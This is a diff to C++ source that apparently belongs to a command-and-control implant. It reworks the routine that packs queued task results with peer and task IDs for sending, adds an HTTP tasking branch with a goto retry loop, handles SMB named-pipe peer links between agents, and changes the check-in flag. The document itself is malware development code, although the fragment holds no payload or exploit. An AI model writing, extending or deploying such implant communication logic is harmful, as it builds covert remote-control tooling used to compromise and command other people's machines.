@@ -150,38 +150,42 @@ namespace Message {
         PSTREAM Swap        = { };
         PARSER Parser       = { };
 
+        retry:
         if (!Ctx->Transport.OutboundQueue) {
+
 #ifdef TRANSPORT_SMB
             return_defer(ERROR_SUCCESS);
-#endif
-            Stream::PackDword(Outbound, Ctx->Session.PeerId);
-            Stream::PackDword(Outbound, Ctx->Session.CurrentTaskId);
-            Stream::PackDword(Outbound, TypeTasking);
+#elifdef TRANSPORT_HTTP
+            PSTREAM Task = Stream::CreateStreamWithHeaders(TypeTasking);
 
+            OutboundQueue(Task);
+            goto retry;
+#endif
         } else {
             Head = Ctx->Transport.OutboundQueue;
             while (Head) {
-                if (Head->Length + MESSAGE_HEADER_SIZE + Outbound->Length > MESSAGE_MAX) {
-                    break;
-                }
-                if (Head->Buffer) {
-                    Parser::CreateParser(&Parser, S_CAST(PBYTE, Head->Buffer), Head->Length);
-                    Stream::PackDword(Outbound, Head->PeerId);
-                    Stream::PackDword(Outbound, Head->TaskId);
-                    Stream::PackDword(Outbound, Head->MsgType);
+                if (!Head->Ready) {
+                    if (Head->Length + MESSAGE_HEADER_SIZE + Outbound->Length > MESSAGE_MAX) {
+                        break;
+                    }
+                    if (Head->Buffer) {
+                        Parser::CreateParser(&Parser, S_CAST(PBYTE, Head->Buffer), Head->Length);
+                        Stream::PackDword(Outbound, Head->PeerId);
+                        Stream::PackDword(Outbound, Head->TaskId);
+                        Stream::PackDword(Outbound, Head->MsgType);
 
-                    if (Ctx->Root) {
-                        Stream::PackBytes(Outbound, S_CAST(PBYTE, Head->Buffer), Head->Length);
+                        if (Ctx->Root) {
+                            Stream::PackBytes(Outbound, S_CAST(PBYTE, Head->Buffer), Head->Length);
+                        } else {
+                            Outbound->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Outbound->Buffer, Outbound->Length + Head->Length);
+                            x_memcpy(S_CAST(PBYTE, Outbound->Buffer) + Outbound->Length, Head->Buffer, Head->Length);
+                            Outbound->Length += Head->Length;
+                        }
                     } else {
-                        Outbound->Buffer = Ctx->Nt.RtlReAllocateHeap(Ctx->Heap, 0, Outbound->Buffer, Outbound->Length + Head->Length);
-                        x_memcpy(S_CAST(PBYTE, Outbound->Buffer) + Outbound->Length, Head->Buffer, Head->Length);
-
-                        Outbound->Length += Head->Length;
+                        return_defer(ERROR_NO_DATA);
                     }
 
                     Head->Ready = TRUE;
-                } else {
-                    return_defer(ERROR_NO_DATA);
                 }
 
                 Head = Head->Next;
@@ -194,7 +198,6 @@ namespace Message {
 #ifdef TRANSPORT_PIPE
         Smb::PeerConnectEgress(Outbound, &Inbound);
 #endif
-
         Stream::DestroyStream(Outbound);
         Outbound = nullptr;
 
@@ -206,9 +209,9 @@ namespace Message {
                 Stream::DestroyStream(Inbound);
             }
             else {
-                Swap = Inbound;
-                Inbound = Outbound;
-                Outbound = Swap;
+                Swap        = Inbound;
+                Inbound     = Outbound;
+                Outbound    = Swap;
 
                 if (Ctx->Config.IngressPipename) {
                     Smb::PeerConnectIngress(Outbound, &Inbound);
@@ -230,7 +233,6 @@ namespace Message {
         }
 
     defer:
-
     }
 
     VOID CommandDispatch (PSTREAM Inbound) {
@@ -248,7 +250,7 @@ namespace Message {
         switch (MsgType) {
 
             case TypeCheckin: {
-                Ctx->Session.Checkin = FALSE;
+                Ctx->Session.Checkin = TRUE;
                 break;
             }
 
